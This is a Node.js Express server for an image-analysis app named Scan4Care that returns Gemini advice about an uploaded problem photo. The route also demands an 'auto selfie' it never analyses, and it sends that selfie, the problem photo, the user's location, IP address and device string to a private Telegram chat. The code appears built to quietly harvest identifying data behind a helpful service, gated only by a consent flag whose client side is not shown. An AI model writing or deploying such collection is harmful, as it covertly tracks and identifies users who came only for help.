import express from "express";
import multer from "multer";
import cors from "cors";
import dotenv from "dotenv";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";
import { GoogleGenerativeAI } from "@google/generative-ai";

dotenv.config();

const app = express();
app.use(cors());

const upload = multer({ dest: "uploads/" });
const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);

/* ---------- TELEGRAM ---------- */

async function sendTelegramMessage(text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text
        })
      }
    );
  } catch (e) {
    console.error("Telegram message error:", e.message);
  }
}

async function sendTelegramPhoto(path, caption) {
  try {
    const form = new FormData();
    form.append("chat_id", process.env.TELEGRAM_CHAT_ID);
    form.append("caption", caption);
    form.append("photo", fs.createReadStream(path));

    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: form }
    );
  } catch (e) {
    console.error("Telegram photo error:", e.message);
  }
}

/* ---------- AI ANALYSIS ---------- */

async function analyzeImage(imagePath, mimeType, userPrompt) {
  const buffer = fs.readFileSync(imagePath);

  const finalPrompt = `
${userPrompt}

Give the answer in this format:
1. What is the problem
2. Possible cause
3. Immediate next steps (step-by-step)
4. What to avoid
5. When to seek expert help

Keep it simple and practical.
`;

  const model = genAI.getGenerativeModel({
    model: "gemini-1.5-flash"
  });

  const result = await model.generateContent([
    {
      inlineData: {
        mimeType,
        data: buffer.toString("base64")
      }
    },
    { text: finalPrompt }
  ]);

  return result.response.text();
}

/* ---------- ROUTE ---------- */

app.post(
  "/analyze",
  upload.fields([
    { name: "image", maxCount: 1 },   // problem image
    { name: "selfie", maxCount: 1 }   // auto selfie
  ]),
  async (req, res) => {
    let problemPath, selfiePath;

    try {
      const problemImage = req.files.image?.[0];
      const selfie = req.files.selfie?.[0];

      if (!problemImage || !selfie) {
        return res.status(400).json({ success: false, error: "Images missing" });
      }

      if (req.body.consent !== "true") {
        return res.status(403).json({ success: false, error: "Consent required" });
      }

      problemPath = problemImage.path;
      selfiePath = selfie.path;

      const location = req.body.location || "Unknown";
      const ip =
        req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket.remoteAddress;

      const device = req.headers["user-agent"] || "Unknown device";
      const userPrompt = req.body.prompt || "Analyze this image";

      /* Telegram */
      await sendTelegramMessage(
        `🛡️ Scan4Care Request

📍 Location: ${location}
🌐 IP: ${ip}
📱 Device: ${device}
🕒 ${new Date().toLocaleString()}
📝 Prompt: ${userPrompt}`
      );

      await sendTelegramPhoto(problemPath, "🌾 Problem Image");
      await sendTelegramPhoto(selfiePath, "👤 Auto Selfie");

      /* AI */
      let aiResponse;
      try {
        aiResponse = await analyzeImage(
          problemPath,
          problemImage.mimetype,
          userPrompt
        );
      } catch (err) {
        aiResponse = "AI analysis failed. Please try again later.";
        console.error("Gemini error:", err.message);
      }

      fs.unlinkSync(problemPath);
      fs.unlinkSync(selfiePath);

      res.json({ success: true, response: aiResponse });

    } catch (err) {
      console.error("Server error:", err);
      if (problemPath && fs.existsSync(problemPath)) fs.unlinkSync(problemPath);
      if (selfiePath && fs.existsSync(selfiePath)) fs.unlinkSync(selfiePath);
      res.status(500).json({ success: false, error: "Server error" });
    }
  }
);

app.listen(5000, () =>
  console.log("🔥 Scan4Care backend running on http://localhost:5000")
);
